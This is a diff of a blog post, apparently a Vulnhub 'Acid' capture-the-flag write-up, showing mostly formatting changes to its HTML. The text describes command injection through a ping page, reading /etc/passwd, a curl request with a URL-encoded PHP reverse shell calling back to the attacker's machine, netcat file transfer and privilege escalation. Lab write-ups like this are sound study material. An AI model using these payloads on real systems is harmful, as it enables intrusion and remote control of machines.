@@ -104,11 +104,11 @@ I got some time this week, therefore I tried the
 
 
 <p>The goal is as usual, get root on the virtual machine. Let's go:</p>
-<h2 id="host-discovery">Host Discovery</h2>
+<h2>Host Discovery</h2>
 <p>As always, we start with host discovery:
 <a href="http://nmap.org">Nmap</a> and <a href="https://cirt.net/Nikto2">nikto</a> are our friends for
 this step.</p>
-<h3 id="nmap">nmap</h3>
+<h3>nmap</h3>
 <p>We launch nmap against the virtual machine:</p>
 <div class="highlight"><pre><span></span>$ nmap 192.168.0.18 -p0-65535 -A -oA nmap
 Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST
@@ -128,10 +128,10 @@ http://nmap.org/submit/ .
 
 <p>We got a nice Apache web server with a simple splash screen. Notice the page
 title: <strong>/Challenge</strong>.</p>
-<h3 id="nikto">Nikto</h3>
+<h3>Nikto</h3>
 <p>I ran nikto on the target but nothing pop out.</p>
-<h2 id="web-exploitation">Web exploitation</h2>
-<h3 id="page-source">Page source</h3>
+<h2>Web exploitation</h2>
+<h3>Page source</h3>
 <p>As we come pretty empty handed, we check the page source and two interesting
 things came out:</p>
 <ul>
@@ -139,7 +139,7 @@ things came out:</p>
 <li>the title of the page (we can see it in the nmap scan) is /Challenge
     and there is an other web page at this address.</li>
 </ul>
-<h4 id="hexa-code">Hexa code</h4>
+<h4>Hexa code</h4>
 <p>We will start with the first lead the hexadecimal code:</p>
 <p><strong>0x643239334c6d70775a773d3d</strong></p>
 <p>We convert it to string and we got:</p>
@@ -150,9 +150,9 @@ things came out:</p>
 web page):</p>
 <p>http://192.168.0.18:33447/images/wow.jpg</p>
 <p>As a result we got a nice image that reward us for our success.</p>
-<p><img alt="wow.jpg" src="/media/2015.09/wow.jpg" /></p>
+<p><img alt="wow.jpg" src="/media/2015.09/wow.jpg"></p>
 <p>Yeah it seems to be some troll :)</p>
-<h3 id="challenge">/Challenge</h3>
+<h3>/Challenge</h3>
 <p>Let us dig the second lead: the page title. By adding <code>/Challenge</code> in the URL,
 we land on an authentication interface.</p>
 <p>I tried to use SQL injection but nothing. We will try
@@ -239,7 +239,7 @@ Files found with a 302 responce:
 
 
 <p>We got some nice result mostly the <code>/command.php</code> page.</p>
-<h3 id="command-execution">Command execution</h3>
+<h3>Command execution</h3>
 <p>The page let us ping an other machine in the network. Nevertheless the page name
 let us think that we can use command exploitation. If we add a <code>;</code> in the filed
 and a command it seems to works, for instance with <code>; ls</code> we got (I use
@@ -258,7 +258,7 @@ tails.php
 <p>We can also read <code>/etc/passwd</code>: there is two users on the server: acid and
 saman.</p>
 <p>Let us try to get a reverse shell with that.</p>
-<h3 id="reverse-shell">reverse shell</h3>
+<h3>reverse shell</h3>
 <p>As always, a good source of information is
 <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>.</p>
 <p>We know the site use php so we will try the php reverse shell first:</p>
@@ -273,13 +273,13 @@ from burp:</p>
 <div class="highlight"><pre><span></span>curl -i -s -k  -X &#39;POST&#39; \
     -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0&#39; -H &#39;DNT: 1&#39; -H &#39;Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
     -b &#39;sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2&#39; \
-    --data-binary $&#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;submit=submit&#39; \
+    --data-binary $&#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;amp;submit=submit&#39; \
     &#39;http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39;
 </pre></div>
 
 
 <p>Now that we have a shell, let us see what we can do.</p>
-<h2 id="shell-exploitation">Shell exploitation</h2>
+<h2>Shell exploitation</h2>
 <p>First we discover what is at our disposal, mostly in the <code>/home/</code>
 (<code>bash_history</code>). In the <code>/home/acid/</code> there is something interesting but
 empty:</p>
@@ -289,47 +289,47 @@ empty:</p>
 
 
 <p>Let us see what else we got on the machine:</p>
-<div class="highlight"><pre><span></span><span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span>
-<span class="nx">bin</span>
-<span class="nx">boot</span>
-<span class="nx">cdrom</span>
-<span class="nx">dev</span>
-<span class="nx">etc</span>
-<span class="nx">home</span>
-<span class="nx">initrd</span><span class="p">.</span><span class="nx">img</span>
-<span class="nx">lib</span>
-<span class="nx">lost</span><span class="o">+</span><span class="nx">found</span>
-<span class="nx">media</span>
-<span class="nx">mnt</span>
-<span class="nx">opt</span>
-<span class="nx">proc</span>
-<span class="nx">root</span>
-<span class="nx">run</span>
-<span class="nx">s</span><span class="p">.</span><span class="nx">bin</span>
-<span class="nx">sbin</span>
-<span class="nx">srv</span>
-<span class="nx">sys</span>
-<span class="nx">tmp</span>
-<span class="nx">usr</span>
-<span class="kd">var</span>
-<span class="nx">vmlinuz</span>
-<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span>
-<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">media</span>
-<span class="nx">acid</span>
-<span class="nx">floppy</span>
-<span class="nx">floppy0</span>
-<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">s</span><span class="p">.</span><span class="nx">bin</span>
-<span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
-<span class="nx">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">s</span><span class="p">.</span><span class="nx">bin</span><span class="o">/</span><span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
-<span class="cp">&lt;?php</span>
-<span class="k">echo</span> <span class="s2">&quot;Now you have to behave like an investigator to catch the culprit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="o">?</span>
+<div class="highlight"><pre><span></span>$ ls /
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+s.bin
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ ls /opt/
+$ ls /media
+acid
+floppy
+floppy0
+$ ls /s.bin
+investigate.php
+$ cat /s.bin/investigate.php
+<span class="p">&amp;</span>lt<span class="p">;</span>?php
+<span class="nb">echo</span> <span class="s2">&quot;Now you have to behave like an investigator to catch the culprit\n&quot;</span><span class="p">;</span>
+?
 </pre></div>
 
 
 <p>That is interesting the php file in <code>/s.bin/</code> clearly tell us to investigate.
 But what we need know is a privilege escalation ti gain root access.</p>
-<h3 id="privilege-escalation">Privilege escalation</h3>
+<h3>Privilege escalation</h3>
 <p>I tried the overlayfs exploit (the same as with
 <a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html">Fart knocker</a>)
 without success:</p>
@@ -347,11 +347,11 @@ exploit failed</p>
 </li>
 </ul>
 <p>But we were given an hint.</p>
-<h3 id="more-investigations">More investigations</h3>
+<h3>More investigations</h3>
 <p>The <a href="http://pwnwiki.io/#!privesc/linux/index.md">pwnwiki.io</a> wiki is always a
 good source of information. So with more investigation we look at bash_history,
 search for <code>*txt*</code> files, an so on. Then <code>*pcap*</code> files:</p>
-<div class="highlight"><pre><span></span>$ find / -name *pcap* <span class="m">2</span>&gt;/dev/null
+<div class="highlight"><pre><span></span>$ find / -name *pcap* <span class="m">2</span><span class="p">&amp;</span>gt<span class="p">;</span>/dev/null
 /lib/modules/3.19.0-15-generic/kernel/drivers/rtc/rtc-pcap.ko
 /lib/modules/3.19.0-15-generic/kernel/drivers/input/misc/pcap_keys.ko
 /lib/modules/3.19.0-15-generic/kernel/drivers/input/touchscreen/pcap_ts.ko
@@ -381,7 +381,7 @@ search for <code>*txt*</code> files, an so on. Then <code>*pcap*</code> files:</
 
 
 <p>Yes <code>/sbin/raw_vs_isi/hint.pcapng</code>!</p>
-<h3 id="pcap">pcap</h3>
+<h3>pcap</h3>
 <p>We transfer the file with netcat:</p>
 <ul>
 <li>On our attack machine: <code>nc -lp 1234 &gt; pcap</code></li>
@@ -403,7 +403,7 @@ What was the name of the Culprit ???</p>
 </blockquote>
 <p>Great, what does it means? We know that saman is one of the user on the machine.
 Maybe we got some hints about it password or something like that.</p>
-<h3 id="interactive-shell">interactive shell</h3>
+<h3>interactive shell</h3>
 <p>In order to execute a su, we need a interactive shell (with
 <a href="https://en.wikipedia.org/wiki/Pseudoterminal">pty/tty</a>).
 Once more <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentest monkey</a>
@@ -418,7 +418,7 @@ will help us:</p>
 
 
 <p>We now need to try to connect as saman.</p>
-<h2 id="saman">Saman</h2>
+<h2>Saman</h2>
 <p>With our beautiful shell we jut have to <code>su saman</code> to try to connect as saman:</p>
 <div class="highlight"><pre><span></span>www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
 su saman
@@ -446,7 +446,7 @@ FLAG NAME: &quot;Acid@Makke@Hax0r
 </pre></div>
 
 
-<h2 id="conclusion">Conclusion</h2>
+<h2>Conclusion</h2>
 <p>It was a nice box to root but as I read the other write up it seems that my way
 was not the one expected.
 Nevertheless, thank to <a href="https://twitter.com/m_avinash143">Avinash Kumar Thapa</a>
